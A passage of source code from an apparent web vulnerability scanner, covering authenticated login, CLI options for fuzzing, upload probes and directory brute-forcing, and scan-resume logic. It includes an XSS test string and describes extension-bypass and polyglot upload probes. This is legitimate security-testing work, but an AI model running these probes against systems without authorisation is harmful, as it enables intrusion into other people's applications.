      `<tr><td><code>${esc(c.url)}</code></td><td>${c.depth}</td>` +
      `<td>${esc(c.source)}</td>` +
      `<td>${c.in_scope ? '<span class="badge badge-yes">Yes</span>' :
        '<span class="badge badge-no">No</span>'}</td></tr>`
    ).join('') + '</table>';
  document.getElementById('crawl-map-table').innerHTML = crawlHtml;
  // Attack surface table.
  const surfaceHtml = '<table><tr><th>Location</th><th>URL</th><th>Method</th>' +
    '<th>Input Name</th><th>Type</th><th>Current Value</th></tr>' +
    surface.map(i =>
      `<tr><td>${esc(i.location)}</td><td><code>${esc(i.url)}</code></td>` +
      `<td>${esc(i.method)}</td><td><code>${esc(i.name)}</code></td>` +
      `<td>${esc(i.input_type)}</td><td><code>${esc(i.current_value)}</code></td></tr>`
    ).join('') + '</table>';
  document.getElementById('attack-surface-table').innerHTML = surfaceHtml;
}

// --- Evidence Vault file viewer ---
// We can't read local files from JS in a file:// context due to browser
// security. Instead, we fetch the file via a relative path. The engineer
// must serve the output folder over HTTP for this to work (e.g.
// `python -m http.server` in the output dir). If file:// is used, the
// viewer falls back to a "download to view" message.
async function loadEvidence(name) {
  const viewer = document.getElementById('evidence-viewer');
  if (!viewer) return;
  viewer.textContent = 'Loading ' + name + '…';
  // Try to fetch the file relative to the report location.
  try {
    const resp = await fetch('evidence/' + encodeURIComponent(name));
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    const text = await resp.text();
    viewer.textContent = text;
  } catch(e) {
    viewer.textContent =
      'Cannot load file directly (browser security restriction on file://).\n' +
      'To view: open the file manually from the evidence/ folder, OR\n' +
      'serve the output directory over HTTP:\n' +
      '  cd ' + window.location.pathname.replace(/\/[^/]*$/, '') + '\n' +
      '  python -m http.server 8000\n' +
      'Then reload this report from http://localhost:8000/report.html\n\n' +
      'Filename: ' + name;
  }
}

// --- HTML escape helper for JS-rendered content ---
function esc(s) {
  if (s === null || s === undefined) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// --- On load: populate dynamic content + show first OWASP cat ---
document.addEventListener('DOMContentLoaded', function() {
  populateAttackSurface();
  // Auto-show the first OWASP category that has findings.
  const firstCatBtn = document.querySelector('.subtab-nav button[data-owasp-cat]');
  if (firstCatBtn) {
    showOwaspCategory(firstCatBtn.getAttribute('data-owasp-cat'));
  }
});
"""


# ============================================================================
# SECTION 15.5 — LOGIN HELPER (Pre-Scan Authentication)
# ============================================================================
#
# Many web applications expose their interesting attack surface only behind
# an authentication wall. Without login support, the scanner would crawl
# the login page, find nothing, and produce a misleadingly clean report.
#
# The LoginHelper performs a Playwright-driven form-based login BEFORE the
# main scan begins. After login, the Playwright BrowserContext retains the
# session cookies, so all subsequent navigation (crawl, header capture,
# active fuzzing) happens as the authenticated user.
#
# DESIGN DECISIONS:
#   - We use Playwright (not raw HTTP) for login because many apps have
#     JavaScript-driven login flows (CSRF token fetching, client-side
#     hashing, multi-step challenges) that a plain HTTP client cannot
#     reproduce.
#   - We DO NOT store credentials in the report or the execution trail.
#     The username appears only in the verbose terminal log; the password
#     is masked everywhere. This is a defence-in-depth measure: if the
#     trail file is exfiltrated, the credentials are not leaked.
#   - We DO NOT verify login success heuristically (e.g. by checking for
#     a "Welcome" message). Heuristic verification produces too many false
#     negatives. Instead, we log the post-login URL and let the engineer
#     verify via the pre-fuzz screenshot in the Header Analysis tab.
#   - If login fails (timeout, element not found, etc.), the scan
#     CONTINUES as an unauthenticated user. The report includes a
#     prominent warning so the engineer knows the scan coverage is
#     limited to the unauthenticated attack surface.

class LoginHelper:
    """Performs form-based login before the main scan begins.

    The helper is intentionally minimal: it fills two fields and clicks
    a submit button. For apps with custom login flows (e.g. multi-factor,
    SSO redirects, magic-link), the engineer should pre-seed the
    Playwright context with session cookies (future feature) or extend
    this class.
    """

    def __init__(
        self,
        login_url: str,
        username: str,
        password: str,
        username_field: str,
        password_field: str,
        submit_selector: str,
        logger: ExecutionTrailLogger,
    ) -> None:
        self.login_url = login_url
        self.username = username
        self.password = password
        # Store the raw field names for logging (the composite selectors
        # below are too verbose to print on every login attempt).
        self.username_field = username_field
        self.password_field = password_field
        # CSS selectors for the username and password fields. We default
        # to attribute-based selectors (input[name='...']) because they
        # are more stable than ID-based selectors (which change with
        # framework versions). We append generic fallbacks (input[type])
        # so login still works if the user only provides a partial name.
        self.username_selector = (
            f"input[name='{username_field}'], "
            f"input[id='{username_field}'], "
            f"input[type='email']"  # last-resort fallback for email-as-username
        )
        self.password_selector = (
            f"input[name='{password_field}'], "
            f"input[id='{password_field}'], "
            f"input[type='password']"  # fallback
        )
        # The submit selector is user-provided (CSS). If empty, we auto-
        # detect by looking for button[type=submit] or input[type=submit].
        self.submit_selector = submit_selector or (
            "button[type=submit], input[type=submit], button:not([type])"
        )
        self.logger = logger

    async def login(self, page: Page) -> bool:
        """Perform the login flow. Returns True on apparent success.

        "Apparent success" means we navigated to the login page, filled
        both fields, clicked submit, and the page navigated away (or
        at least didn't immediately error). We do NOT verify the
        post-login state — the engineer must do that via the screenshot
        in the Header Analysis tab.
        """
        # Log the login attempt. We mask the password even in the
        # verbose log — credentials must NEVER appear in log files.
        masked_pw = "*" * len(self.password) if self.password else ""
        self.logger.log(
            "login_start",
            f"url={self.login_url} user={self.username} "
            f"password={masked_pw} user_field={self.username_field} "
            f"pass_field={self.password_field}",
        )

        try:
            # Navigate to the login page. We use 'networkidle' to ensure
            # any JavaScript-driven form hydration (e.g. CSRF token
            # injection by SPA frameworks) has completed before we try
            # to fill the fields.
            await _pw(page.goto, self.login_url, wait_until="networkidle",
                            timeout=20000, default=None)
        except Exception as e:
            self.logger.log("login_error",
                            f"failed to navigate to {self.login_url}: {e}")
            return False

        # Fill the username field. The selector list tries name=, then
        # id=, then a type-based fallback. query_selector returns the
        # first match in document order.
        try:
            user_elem = await self._find_first(page, self.username_selector)
            if user_elem is None:
                self.logger.log("login_error",
                                f"username field not found with selector: "
                                f"{self.username_selector}")
                return False
            await _pw(user_elem.fill, self.username, default=None)
            self.logger.log("login_step", "filled username field")
        except Exception as e:
            self.logger.log("login_error", f"failed to fill username: {e}")
            return False

        # Fill the password field.
        try:
            pass_elem = await self._find_first(page, self.password_selector)
            if pass_elem is None:
                self.logger.log("login_error",
                                f"password field not found with selector: "
                                f"{self.password_selector}")
                return False
            await _pw(pass_elem.fill, self.password, default=None)
            self.logger.log("login_step", "filled password field")
        except Exception as e:
            self.logger.log("login_error", f"failed to fill password: {e}")
            return False

        # Click submit. We use click() rather than pressing Enter because
        # some forms have JavaScript onclick handlers that intercept
        # Enter and behave differently (e.g. trigger client-side validation
        # that prevents submission).
        try:
            submit_elem = await self._find_first(page, self.submit_selector)
            if submit_elem is None:
                self.logger.log("login_error",
                                f"submit button not found with selector: "
                                f"{self.submit_selector}")
                return False
            # Click and wait for the post-login navigation. We use
            # 'domcontentloaded' rather than 'networkidle' here because
            # some apps keep long-lived connections (websockets, polling)
            # that never reach idle, which would cause the wait to time
            # out even though login succeeded.
            # Both click() and wait_for_load_state() are wrapped in _pw()
            # for a 5s hard cap — prevents freeze on pages with hanging
            # sub-resources.
            await _pw(submit_elem.click, default=None)
            try:
                await _pw(page.wait_for_load_state, "domcontentloaded",
                                timeout=15000, default=None)
            except PWTimeoutError:
                self.logger.log("login_warn",
                                "post-login navigation timed out; "
                                "login may still have succeeded (the "
                                "click was registered but the server "
                                "took >15s to respond)")
            self.logger.log("login_step",
                            f"clicked submit; post-login URL={page.url}")
        except Exception as e:
            self.logger.log("login_error", f"failed to click submit: {e}")
            return False

        # Give the page a moment to settle post-login. Many apps redirect
        # to a dashboard, fetch user profile data, etc. Without this wait,
        # the subsequent header capture might race ahead of these requests
        # and miss them (the response handler would not be registered yet).
        await asyncio.sleep(2.0)

        # Heuristic success check: if the URL changed from the login URL,
        # that's a strong signal login succeeded. If it didn't change,
        # we warn but don't fail — some apps render the dashboard at the
        # same URL (Single Page Apps commonly do this).
        if page.url == self.login_url:
            self.logger.log("login_warn",
                            "URL did not change after login — login may "
                            "have FAILED (bad credentials? account locked?) "
                            "OR the app renders the dashboard at the same "
                            "URL. Verify via the pre-fuzz screenshot in "
                            "the Header Analysis tab.")
        else:
            self.logger.log("login_success",
                            f"post-login URL={page.url} (different from "
                            f"login URL — likely success)")

        return True

    async def _find_first(self, page: Page, selector_list: str):
        """Find the first matching element from a comma-separated selector list.

        Playwright's query_selector() already supports comma-separated
        selectors (it returns the first match in document order), but we
        wrap it to add error handling for malformed selectors.
        Wrapped in _pw() for a 5s hard cap.
        """
        try:
            return await _pw(page.query_selector, selector_list, default=None)
        except Exception as e:
            self.logger.log("login_warn",
                            f"selector query failed for '{selector_list}': {e}")
            return None


# ============================================================================
# SECTION 16 — CLI ARGUMENT PARSER
# ============================================================================
#
# We use argparse from the stdlib. The CLI is intentionally explicit —
# every flag has a clear name and a sensible default. We do NOT support
# a "quiet" mode (see the design principles at the top of this file).

def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
    """Parse command-line arguments.

    Parameters
    ----------
    argv : optional list of argument strings. If None, sys.argv[1:] is used.

    Returns
    -------
    argparse.Namespace with all parsed arguments.
    """
    p = argparse.ArgumentParser(
        prog="scanner.py",
        description=(
            "Offline web security assessment tool. Automates header "
            "capture, crawling, attack-surface mapping, and OWASP Top 10 "
            "checks. Produces a self-contained HTML report with raw "
            "evidence for manual audit. ALL findings are UNVERIFIED."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "EXAMPLES\n"
            "  Basic scan:\n"
            "    python scanner.py --url https://target.example.com\n\n"
            "  Full scan with custom scope:\n"
            "    python scanner.py --url https://target.example.com \\\n"
            "        --headers whitelist.txt --payloads payloads.txt \\\n"
            "        --output ./scan_report --depth 3 --delay 500 \\\n"
            "        --scope '/app/*,/api/v1/*' --exclude '*/logout,*.pdf'\n\n"
            "ENVIRONMENT VARIABLES (for LLM adapter)\n"
            "  LLM_BASE_URL  — full URL of chat-completions endpoint\n"
            "  LLM_API_KEY   — bearer token\n"
            "  LLM_MODEL     — model identifier (default: gpt-4o-mini)"
        ),
    )
    # --- Required ---
    p.add_argument("--url", required=True,
                   help="Target URL (must include scheme, e.g. https://...)")
    # --- Output ---
    p.add_argument("--output", default="./scan_report",
                   help="Output directory for the report + evidence "
                        "(default: ./scan_report)")
    # --- Reference files ---
    p.add_argument("--headers", default=None,
                   help="Path to a .txt file with one reference header "
                        "per line. Used for cross-referencing, NOT filtering. "
                        "If omitted, a built-in default list is used (with "
                        "a warning).")
    p.add_argument("--payloads", default=None,
                   help="Path to a .txt file with one fuzzing payload per "
                        "line. If omitted, payloads are loaded from "
                        "bin/payloads.txt (editable). If that file is "
                        "missing or empty, active fuzzing is skipped.")
    p.add_argument("--wordlist", default=None,
                   help="Path to a .txt file with one directory/file path "
                        "per line for directory brute-forcing. If omitted, "
                        "bin/wordlist.txt is used. Per-scan override.")
    p.add_argument("--weak-ciphers", default=None,
                   help="Path to a .txt file with the weak-cipher / TLS-"
                        "protocol policy. If omitted, bin/weak_ciphers.txt "
                        "is used. Per-scan override (loaded at scan start).")
    # --- Crawler ---
    p.add_argument("--depth", type=int, default=3,
                   help="Maximum crawl depth (default: 3)")
    p.add_argument("--scope", default="",
                   help="Comma-separated glob patterns. Only URLs matching "
                        "these patterns will be crawled/fuzzed. "
                        "Example: /app/*,/api/v1/*")
    p.add_argument("--exclude", default="",
                   help="Comma-separated glob patterns. URLs matching these "
                        "patterns will NEVER be fuzzed. "
                        "Example: */logout,*/delete,*.pdf")
    p.add_argument("--allow-external", action="store_true",
                   help="Allow the crawler to follow external links "
                        "(off the target's registrable domain). "
                        "DANGEROUS — use only with explicit authorisation.")
    p.add_argument("--ignore-robots", action="store_true",
                   help="Ignore robots.txt Disallow rules. The default is "
                        "to respect 'User-agent: *' rules.")
    # --- Rate limiting ---
    p.add_argument("--delay", type=int, default=500,
                   help="Delay between requests in milliseconds (default: 500). "
                        "A ±10%% jitter is applied automatically.")
    p.add_argument("--concurrency", type=int, default=1,
                   help="Number of parallel Playwright contexts (default: 1, "
                        "hard max: 3)")
    # --- Payload safety ---
    p.add_argument("--max-payload-bytes", type=int, default=2000,
                   help="Maximum payload size in bytes. Larger payloads are "
                        "truncated (default: 2000)")
    # --- LLM ---
    p.add_argument("--llm-tokens", type=int, default=4000,
                   help="Token budget for LLM executive-summary generation "
                        "(default: 4000). If findings exceed this, only "
                        "highest-severity findings are summarised.")
    p.add_argument("--llm-assist", action="store_true", default=False,
                   help="Enable LLM-in-the-loop adaptive scanning. After "
                        "crawling, the LLM analyses the discovered URLs + "
                        "inputs and suggests: priority inputs to test first, "
                        "custom tech-stack-specific payloads, and additional "
                        "URLs to crawl. The LLM NEVER executes anything — it "
                        "only advises. Requires LLM_BASE_URL + LLM_API_KEY "
                        "env vars to be set. If the LLM is unavailable, the "
                        "scanner proceeds with default behaviour.")
    p.add_argument("--llm-interesting", action="store_true", default=False,
                   help="AI Content Analysis during the scan: after the crawl "
                        "(and directory brute-force re-crawl), re-visit EVERY "
                        "in-scope discovered page with the authenticated "
                        "browser and ask the LLM, one page at a time, for "
                        "interesting content (hardcoded creds, hidden "
                        "endpoints, dev comments, logic flaws). Findings "
                        "stream to llm_interesting_findings.json (the "
                        "Interesting tab loads them automatically). NO page "
                        "cap — unlike the post-scan web button which only "
                        "analyzes the first 20 saved pages. Cost: 1 LLM call "
                        "per page, so OFF by default.")
    p.add_argument("--llm-analyze", action="store_true", default=False,
                   help="Enable LLM vulnerability analysis. After active "
                        "scanning, the LLM reviews the findings + raw HTTP "
                        "responses to detect vulnerabilities the regex "
                        "missed, classify findings into OWASP categories, "
                        "and identify likely false positives. The analysis "
                        "is saved to llm_analysis.json. Requires LLM env vars.")
    p.add_argument("--custom-headers", default="",
                   help="JSON string of HTTP headers to send with EVERY "
                        "request during the scan. Use for CSRF tokens, "
                        "Authorization headers, custom auth cookies, etc. "
                        'Example: \'{"X-CSRF-Token":"abc","X-Client":"test"}\'')
    p.add_argument("--test-access-control", action="store_true", default=False,
                   help="Test for Broken Access Control (A01) via forced "
                        "browsing. After the scan, clears all cookies from "
                        "the browser context and re-visits each in-scope URL "
                        "to check if it's accessible without authentication. "
                        "Most useful when combined with --login-url. Safe "
                        "for production (read-only — no data modification).")
    p.add_argument("--test-file-upload", action="store_true", default=False,
                   help="Test <input type=file> endpoints for unrestricted / "
                        "dangerous uploads (OWASP A05:2025 Injection). "
                        "Browser-driven (set_input_files + real form submit) "
                        "with ~10 probes: extension bypass (.php/.phtml/.php5/"
                        "double/null-byte), MIME spoof, GIF89a polyglot, "
                        "SVG/HTML stored-XSS, and a benign baseline. Emits "
                        "UNVERIFIED findings + writes file_uploads.json (full "
                        "table with landing URLs for manual verification). "
                        "Only fires on pages that have a file input.")
    p.add_argument("--upload-base-filename", type=str, default="webrecon_upload",
                   help="Base filename for --test-file-upload probes. The "
                        "scanner appends extensions (.php/.phtml/.svg/etc) to "
                        "form the per-probe filename. Default: webrecon_upload. "
                        "Pick something unique so you can grep for it "
                        "server-side.")
    p.add_argument("--resume", action="store_true", default=False,
                   help="Resume a previously interrupted scan. Loads "
                        "scan_state.json from the --output directory and "
                        "skips phases that already completed. Useful when a "
                        "scan was interrupted (Ctrl+C, crash, timeout) and "
                        "you want to continue without re-doing the crawl.")
    p.add_argument("--skip-tests", type=int, default=0,
                   help="Skip the first N tests in the active scan phase. "
                        "Use for debugging: if the scan freezes at test 460, "
                        "run with --skip-tests 459 to jump directly to the "
                        "problematic test. The crawl + header capture + SSL "
                        "phases still run normally; only active fuzzing is "
                        "skipped ahead. Example: --skip-tests 459")
    p.add_argument("--verbose-tests", action="store_true", default=False,
                   help="Log EVERY test (not just every 10th) in the active "
                        "scan phase. Use for debugging freezes — shows "
                        "exactly which test is hanging. Example: "
                        "'active_inject: test 460/532 input=username "
                        "payload=<body onload=alert(1)>'")
    p.add_argument("--load-state", default="",
                   help="Path to a Playwright storageState JSON file "
                        "(cookies + localStorage) to load before scanning. "
                        "Use this when you've captured a session via the "
                        "'Launch Browser to Login' button — the scanner "
                        "loads the captured cookies so it scans as the "
                        "authenticated user. Coexists with --login-url + "
                        "--custom-headers.")
    p.add_argument("--ignore-session-expiry", action="store_true", default=False,
                   help="Completely disable session-expiry detection. The "
                        "scanner will NEVER pause for re-login, even if it "
                        "sees a 401, 302 redirect to /login, or login page "
                        "keywords. Use this for unauthenticated scans where "
                        "the target redirects everything to /login (which "
                        "is normal for an unauthenticated visitor, NOT a "
                        "session expiry). Also useful when you want to scan "
                        "without interruption and handle auth manually.")
    p.add_argument("--debug", action="store_true", default=False,
                   help="Enable verbose debug logging. Logs EVERY Playwright "
                        "action with timing, response status, body length, "
                        "patterns checked, and whether a finding was recorded. "
                        "Use this when troubleshooting freezes or missing "
                        "findings — the debug log can be shared for analysis. "
                        "Also enables --verbose-tests automatically.")
    p.add_argument("--deep-logic", action="store_true", default=False,
                   help="EXPERIMENTAL: Run deep logic testing for business "
                        "logic flaws (OWASP A06:2025 Insecure Design). Performs "
                        "happy-path walkthroughs + mutates numeric parameters "
                        "(negative, zero, extreme values) to detect anomalies "
                        "like negative prices or bypassed validation. SLOW — "
                        "disabled by default. All findings are UNVERIFIED.")
    p.add_argument("--crawl-only", action="store_true", default=False,
                   help="Crawl Only mode: skip active fuzzing entirely. "
                        "Crawls the target, captures headers, inspects SSL, "
                        "maps the attack surface, runs directory brute-force, "
                        "and captures page sources — but does NOT inject any "
                        "payloads. Use this to: (1) see what the crawler finds, "
                        "(2) generate LLM payloads/wordlist based on crawl "
                        "results, (3) review interesting URLs + headers, "
                        "(4) plan your active scan. The report is generated "
                        "with all crawl data but 0 findings.")
    p.add_argument("--skip-dir-brute", action="store_true", default=False,
                   help="Skip directory brute-forcing. Useful for 'Crawl Only' "
                        "mode when you want just the crawl + headers + SSL + "
                        "attack surface without the extra time of trying 70+ "
                        "directory paths. Combined with --crawl-only, this gives "
                        "the fastest recon mode.")
    p.add_argument("--crawl-llm-urls", action="store_true", default=False,
                   help="Auto-crawl URLs suggested by the LLM planner. "
                        "By default, LLM-suggested URLs are logged for "
                        "review but NOT crawled (scope-escape risk). This "
                        "flag overrides that — the scanner will crawl any "
                        "LLM-suggested URL that is on the SAME domain as "
                        "the target. URLs on other domains are still "
                        "skipped (use --allow-external for those).")
    p.add_argument("--no-watchdog", action="store_true", default=False,
                   help="DISABLE all watchdog timers + context recycle. "
                        "By default the scanner has 3 watchdogs that kill "
                        "Chrome if a test hangs: (1) per-test 60s pkill, "
                        "(2) progress 120s pkill, (3) proactive context "
                        "recycle every 50 tests. This flag disables ALL "
                        "three so you can test whether a hang is caused "
                        "by the watchdogs killing Chrome at a bad time "
                        "or by something else (e.g. the page dying on "
                        "its own). WARNING: with watchdogs disabled, a "
                        "truly hung test will freeze the scan forever — "
                        "only use this for debugging. Also settable via "
                        "the WEBRECON_DISABLE_WATCHDOG=1 env var.")
    p.add_argument("--report-only", action="store_true", default=False,
                   help="Skip ALL scanning and just regenerate report.html "
                        "from the JSON files already on disk in --output "
                        "(findings.json, ssl_record.json, passive_findings.json, "
                        "crawl_map.json, etc.). Used by the web UI's "
                        "force-complete action so a force-completed scan gets "
                        "the FULL styled report (tabs, evidence, OWASP) instead "
                        "of a minimal table. No browser, no network, no LLM.")
    # --- Browser ---
    p.add_argument("--browser-headless", action="store_true", default=True,
                   help="Run Playwright in headless mode (default: True). "
                        "Pass --no-browser-headless to disable.")
    p.add_argument("--no-browser-headless", dest="browser_headless",
                   action="store_false",
                   help="Run Playwright in headed mode (visible browser). "
                        "Useful for debugging or for targets that detect "
                        "headless browsers.")

    # --- Login / authentication (optional) -----------------------------
    # These flags enable pre-scan login so the scanner can assess the
    # authenticated attack surface. If --login-url is omitted, the scan
    # runs unauthenticated. If --login-url is provided, --login-user and
    # --login-password are REQUIRED.
    p.add_argument("--login-url", default=None,
                   help="URL of the login page to authenticate against "
                        "BEFORE scanning. If omitted, the scan runs "
                        "unauthenticated. Example: https://app.example.com/login")
    p.add_argument("--login-user", default=None,
                   help="Username (or email) for the login form. "
                        "Required if --login-url is set.")
    p.add_argument("--login-password", default=None,
                   help="Password for the login form. Required if "
                        "--login-url is set. WARNING: the password is "
                        "passed on the command line and may be visible "
                        "in the system process list. For sensitive "
                        "engagements, use the WEBRECON_LOGIN_PASSWORD "
                        "environment variable instead.")
    p.add_argument("--login-user-field", default="username",
                   help="Name or ID of the username input field in the "
                        "login form (default: 'username'). Common "
                        "alternatives: 'user', 'email', 'login'.")
    p.add_argument("--login-pass-field", default="password",
                   help="Name or ID of the password input field in the "
                        "login form (default: 'password').")
    p.add_argument("--login-submit-selector", default="",
                   help="CSS selector for the login form's submit button. "
                        "If omitted, the tool auto-detects "
                        "button[type=submit] or input[type=submit]. "
                        "Example: 'button.login-btn'")

    args = p.parse_args(argv)
    # --- Post-parse validation ---
    if not args.url.startswith(("http://", "https://")):
        p.error("--url must include the scheme (http:// or https://)")
    if args.concurrency < 1 or args.concurrency > RateLimiter.HARD_MAX_CONCURRENCY:
        p.error(f"--concurrency must be between 1 and "
                f"{RateLimiter.HARD_MAX_CONCURRENCY}")
    if args.depth < 0:
        p.error("--depth must be >= 0")
    # --- LLM token budget env override ---
    # Same precedence as the web side: an EXPLICIT --llm-tokens flag wins;
    # otherwise WEBRECON_LLM_MAX_TOKENS (the env override the web UI honors)
    # beats the argparse default, so CLI-launched scans match web-launched
    # ones. (The web runner always passes --llm-tokens explicitly with the
    # already-resolved value, so this only affects direct CLI runs.)
    if "--llm-tokens" not in sys.argv:
        _env_max_tokens = os.environ.get("WEBRECON_LLM_MAX_TOKENS", "")
        if _env_max_tokens:
            try:
                _env_max_tokens_i = int(_env_max_tokens)
                if _env_max_tokens_i > 0:
                    args.llm_tokens = _env_max_tokens_i
            except ValueError:
                pass  # malformed env value — keep the default
    # --- Login validation ---
    # If --login-url is provided, --login-user and --login-password are
    # required. The password may come from the CLI OR from the
    # WEBRECON_LOGIN_PASSWORD env var (preferred for sensitive engagements
    # to avoid the process-list leak).
    if args.login_url and not args.load_state:
        # Form-login requires a username + password. EXEMPT when --load-state
        # is also given: a captured session is authoritative (and is the only
        # way to auth OAuth/SSO flows like Microsoft/Google/SAML, where the
        # app's login page redirects to an IdP and form login can't succeed).
        if not args.login_user:
            p.error("--login-user is required when --login-url is set "
                    "(unless --load-state is provided)")
        # Password: prefer env var, fall back to CLI flag.
        env_pw = os.environ.get("WEBRECON_LOGIN_PASSWORD", "")
        if not args.login_password and not env_pw:
            p.error("--login-password (or WEBRECON_LOGIN_PASSWORD env var) "
                    "is required when --login-url is set "
                    "(unless --load-state is provided)")
        if env_pw:
            args.login_password = env_pw
            # Note: we don't log this — the env var path is intentionally
            # quiet so the password doesn't appear in shell history or
            # process args.
    # Split comma-separated scope/exclude patterns.
    args.scope_patterns = [
        s.strip() for s in args.scope.split(",") if s.strip()
    ] if args.scope else []
    args.exclude_patterns = [
        s.strip() for s in args.exclude.split(",") if s.strip()
    ] if args.exclude else []
    return args


# ============================================================================
# SECTION 17 — MAIN ORCHESTRATOR
# ============================================================================
#
# The orchestrator ties together all modules in the correct order:
#   1. Parse CLI args + initialise logger + signal handlers.
#   2. Launch Playwright (chromium, headless by default).
#   3. Header Capture (navigates to target, records all response headers).
#   4. SSL/TLS inspection (raw socket — no Playwright).
#   5. Crawler (BFS, scope-enforced).
#   6. Attack Surface Mapper (visits in-scope URLs, catalogues inputs).
#   7. Passive OWASP checks (headers, cookies, mixed content).
#   8. Evidence Engine: capture "before" screenshot.
#   9. Active OWASP checks (inject payloads into discovered inputs).
#  10. Evidence Engine: capture "after" screenshot.
#  11. LLM executive summary (with graceful fallback).
#  12. Render HTML report.
#  13. Cleanup (close browser, close trail file).
#
# At every step we check GLOBAL_STATE.stop_event so an interrupting
# signal can abort cleanly and trigger partial-report rendering.

def save_scan_state(
    output_dir: Path,
    completed_phases: List[str],
    header_records: Optional[List[HeaderRecord]] = None,
    ssl_record: Optional[SSLRecord] = None,
    crawl_map: Optional[List[CrawledURL]] = None,
    attack_surface: Optional[List[InputField]] = None,
    passive: Optional[PassiveFindings] = None,
    findings: Optional[List[Finding]] = None,
    llm_plan: Optional[Dict[str, Any]] = None,
    llm_analysis: Optional[Dict[str, Any]] = None,
    login_succeeded: Optional[bool] = None,
) -> None:
    """Save the current scan state to scan_state.json for resume support.

    Called after each phase completes. On resume, the orchestrator loads
    this file and skips phases that are in completed_phases.

    We serialize ALL data needed to resume: the crawl map, attack surface,
    findings so far, header records, SSL record, passive findings, etc.
    This makes the resume file potentially large (hundreds of KB for big
    scans), but it's the only way to faithfully resume without re-running
    completed phases.
    """
    state: Dict[str, Any] = {
        "completed_phases": completed_phases,
        "saved_at": datetime.now(timezone.utc).isoformat(),
    }
    if header_records is not None:
        state["header_records"] = [asdict(h) for h in header_records]
    if ssl_record is not None:
        state["ssl_record"] = asdict(ssl_record)
    if crawl_map is not None:
        state["crawl_map"] = [asdict(c) for c in crawl_map]
    if attack_surface is not None:
        state["attack_surface"] = [asdict(i) for i in attack_surface]
    if passive is not None:
        state["passive"] = asdict(passive)
    if findings is not None:
        # Convert Finding objects to dicts; strip screenshot_path to
        # just the filename (paths are relative to the evidence dir).
        findings_data = []
        for f in findings:
            d = asdict(f)
            if d.get("screenshot_path"):
                d["screenshot_path"] = os.path.basename(d["screenshot_path"])
            findings_data.append(d)
        state["findings"] = findings_data
    if llm_plan is not None:
        state["llm_plan"] = llm_plan
    if llm_analysis is not None:
        state["llm_analysis"] = llm_analysis
    if login_succeeded is not None:
        state["login_succeeded"] = login_succeeded

    state_path = output_dir / "scan_state.json"
    state_path.write_text(
        json.dumps(state, indent=2, ensure_ascii=False, default=str),
        encoding="utf-8",
    )


def _dedupe_findings_by_id(findings: List["Finding"]) -> List["Finding"]:
    """Drop findings that share a finding_id with an earlier entry (keep first).

    Across supervisor restarts / Kill-Chrome-&-Restart / --resume, the same
    finding can occasionally land in the accumulated list more than once
    (incremental writes + scan_state reloads can race). Duplicate ids cause
    React key collisions in the OWASP tab and duplicate sub-tabs in the HTML
    report. Applying this at every findings.json write + before report
    rendering keeps both on-disk data and the report clean. Findings with an
    empty/missing id are kept as-is (they're rare and dedupe would drop
    legitimate distinct ones).
    """
    seen: Set[str] = set()
    out: List["Finding"] = []
    for f in findings:
        fid = getattr(f, "finding_id", "") or ""
        if fid and fid in seen:
            continue
        if fid:
            seen.add(fid)
        out.append(f)
    return out


def _dataclass_from_dict(cls: Any, data: Any) -> Optional[Any]:
    """Rebuild a dataclass from a dict, ignoring unknown keys (version-skew safe).

    scan_state.json is written with `asdict(record)`, which emits EVERY field
    of the dataclass at save time. On resume we rebuild with
    `Cls(**state[key])`. The problem: if a NEWER scanner saved extra fields
    (e.g. SSLRecord.supported_ciphers) and an OLDER scanner tries to load
    that state, the older dataclass doesn't accept the unknown kwarg and
    resume crashes with TypeError. The reverse (newer code, older state) is
    already safe because missing keys fall back to field defaults.

    This helper filters the dict to only the keys the dataclass actually
    accepts, so resume is robust to version skew in BOTH directions. Returns
    None if construction fails for any other reason (the caller treats None
    as "no saved record" and re-runs the phase).
    """
    if not isinstance(data, dict):
        return None
    try:
        fields = {f.name for f in __import__("dataclasses").fields(cls)}
    except Exception:
        return None
    filtered = {k: v for k, v in data.items() if k in fields}
    try:
        return cls(**filtered)
    except Exception:
        return None


def load_scan_state(output_dir: Path) -> Optional[Dict[str, Any]]:
    """Load scan_state.json for resume. Returns None if not found."""
    state_path = output_dir / "scan_state.json"
    if not state_path.exists():
        return None
    try:
        return json.loads(state_path.read_text(encoding="utf-8"))
    except Exception:
        return None


# ============================================================================
# DIRECTORY BRUTE-FORCING
# ============================================================================
#
# The wordlist is loaded ONLY from bin/wordlist.txt. There is NO hardcoded
# fallback. If the file is missing or empty, directory brute-forcing is
# skipped with a warning.
#
# The user controls the wordlist via:
#   1. Editing bin/wordlist.txt directly
#   2. Replacing it with a larger list (e.g. SecLists common.txt)


async def _run_directory_bruteforce(
    page: Page,
    target_url: str,
    crawl_map: List["CrawledURL"],
    rate_limiter: RateLimiter,
    logger: ExecutionTrailLogger,
    output_dir: Path,
    software_inventory: Dict[str, Any],
    llm_adapter: LLMAdapter,
    wordlist_path: Optional[Path] = None,
) -> List[Dict[str, Any]]:
    """Try common admin/config paths from a bundled wordlist.

    If the LLM is configured, it reorders the wordlist based on detected
    technology (e.g. WordPress → wp-admin first, Tomcat → manager first).
    This is the "LLM-optimized" feature the boss wants to hear about.

    Returns a list of {path, url, status, title} for paths that returned
    200 or 301/302 (not 404).
    """
    findings: List[Dict[str, Any]] = []
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # Load the wordlist via the shared helper (default bin/wordlist.txt;
    # --wordlist can override per-scan). NO hardcoded fallback.
    wordlist, wordlist_path = _load_wordlist(wordlist_path, logger)
    if not wordlist:
        return []

    # If the LLM is configured, ask it to reorder the wordlist based on
    # detected technology. This is a legitimate optimization — the LLM
    # knows that WordPress sites are more likely to have /wp-admin than
    # /phpmyadmin, etc.
    if llm_adapter.enabled:
        try:
            tech_summary = [
                f"{item['product']} {item['version']} ({item['category']})"
                for item in software_inventory.get("items", [])[:10]
            ]
            # Discovered URL paths from the crawl — lets the LLM prioritise
            # paths related to the app's REAL structure (e.g. if /api/*
            # was found, /api/admin and /api/v1/ rank higher than /phpmyadmin).
            crawl_paths: List[str] = []
            for c in crawl_map:
                if c.in_scope and c.url:
                    try:
                        crawl_paths.append(urlparse(c.url).path or "/")
                    except Exception:
                        pass
